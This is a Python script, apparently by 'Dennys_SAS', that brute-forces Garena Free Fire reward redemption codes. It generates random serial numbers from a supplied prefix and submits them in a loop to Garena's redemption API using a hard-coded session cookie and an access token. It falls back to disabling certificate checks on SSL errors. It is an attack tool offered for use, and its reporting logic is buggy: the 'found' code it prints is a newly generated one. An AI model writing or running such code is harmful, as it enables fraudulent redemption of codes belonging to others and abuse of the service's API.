#!/usr/bin/env python3
from operator import ge
import time
import random
import string
import argparse
import requests
from rich import print
import urllib3

proxies = {
    "http":"http://127.0.0.1:8181",
    "https":"http://127.0.0.1:8181",
    }

parser = argparse.ArgumentParser()
parser.add_argument("-c", "--codigin", help="codigin", dest="codigin", type=str, required=True)
parser.add_argument("-t", "--token", help="access token", dest="token", type=str, required=True )
args = parser.parse_args()
Inic_codigin = str(args.codigin)
FF_Token = str(args.token)

def gerador_codingin():

    a = ''.join(random.choice(string.ascii_uppercase) for _ in range(1))

    b = ''.join(random.choice(string.digits) for _ in range(1))

    c = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))

    return "{}{}{}{}".format(Inic_codigin, a, b, c)


def reques():
    erro = 1
    access_token = FF_Token
    codigin = gerador_codingin()
    paylod = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Cookie": "_ga=GA1.2.1580628210.1648270858; _gid=GA1.2.887630064.1648270858; apple_state_key=ff876a66acc115ecb16c2a644eab852a; token_session=efe81d9e7bbef6b7c36e6a89d6bc9100b549d5fdb479b633cc3544f5cd0c372b910fd334c10b28af4d4d8e745f9d5504",
    "Content-Type": "application/json",
    "Access-Token": access_token,
    "Origin": "https://reward.ff.garena.com",
    }
    
    data_json = {"serialno": codigin}

    url_google_login = "https://prod-api.reward.ff.garena.com/redemption/api/game/ff/multiple/redeem/"

    session = requests.Session()
    try:
        google = session.post(url_google_login, headers=paylod, json=data_json, verify=True)
        soup = (google.text)
        return soup 
    
    except requests.exceptions.SSLError as err:
        google = session.post(url_google_login, headers=paylod, json=data_json, verify=False)
        soup = (google.text)
        return soup 
    

   
    


def validacao():
    def loop():
        while "error_invalid_serialno" in reques():
            print ("[red][-] Injetando Codigin:[/red] {}[red][-][/red]".format(gerador_codingin()))
            time.sleep(0.5)   
    loop()
   
    if "error_too_many_requests" in reques():
        print ("[yellow][!] Muitas Tentativas [!][/yellow]")
    if "expired" in reques():
        print("[yellow][!] Token Expirado [!][/yellow]")
    
    if "error_invalid_token" in reques():
        print("[yellow][!] Token Invalido [!][/yellow]", )
    if "Success" in reques():
        print ("[green][+] Codigin Encontrado:[/green] {}[green][+][/green]".format(gerador_codingin()))
        print (reques())
    else:
        raise SystemExit
def logo():
                                                                                                                                                               
    logo_ascci =  """[green]
##############################################################################################################################################################
#      _____           _____         _____    ____  _____   ______           ____      ______         _____   _________________       _____         _____    #
#  ___|\    \     ____|\    \    ___|\    \  |    ||\    \ |\     \         |    | ___|\     \    ___|\    \ /                 \ ____|\    \    ___|\    \   #
# /    /\    \   /     /\    \  |    |\    \ |    | \\    \| \     \        |    ||     \     \  /    /\    \\______     ______//     /\    \  |    |\    \  #
#|    |  |    | /     /  \    \ |    | |    ||    |  \|    \  \     |       |    ||     ,_____/||    |  |    |  \( /    /  )/  /     /  \    \ |    | |    | #
#|    |  |____||     |    |    ||    | |    ||    |   |     \  |    | ____  |    ||     \--'\_|/|    |  |____|   ' |   |   '  |     |    |    ||    |/____/  #
#|    |   ____ |     |    |    ||    | |    ||    |   |      \ |    ||    | |    ||     /___/|  |    |   ____      |   |      |     |    |    ||    |\    \  #
#|    |  |    ||\     \  /    /||    | |    ||    |   |    |\ \|    ||    | |    ||     \____|\ |    |  |    |    /   //      |\     \  /    /||    | |    | #
#|\ ___\/    /|| \_____\/____/ ||____|/____/||____|   |____||\_____/||\____\|____||____ '     /||\ ___\/    /|   /___//       | \_____\/____/ ||____| |____| #
#| |   /____/ | \ |    ||    | /|    /    | ||    |   |    |/ \|   ||| |    |    ||    /_____/ || |   /____/ |  |`   |         \ |    ||    | /|    | |    | #
# \|___|    | /  \|____||____|/ |____|____|/ |____|   |____|   |___|/ \|____|____||____|     | / \|___|    | /  |____|          \|____||____|/ |____| |____| #
#   \( |____|/      \(    )/      \(    )/     \(       \(       )/      \(   )/    \( |_____|/    \( |____|/     \(               \(    )/      \(     )/   #
#    '   )/          '    '        '    '       '        '       '        '   '      '    )/        '   )/         '                '    '        '     '    #
#        '                                                                                '             '                                 By: Dennys_SAS     #                      
##############################################################################################################################################################      
[/green]"""


    print (logo_ascci)



logo()
validacao()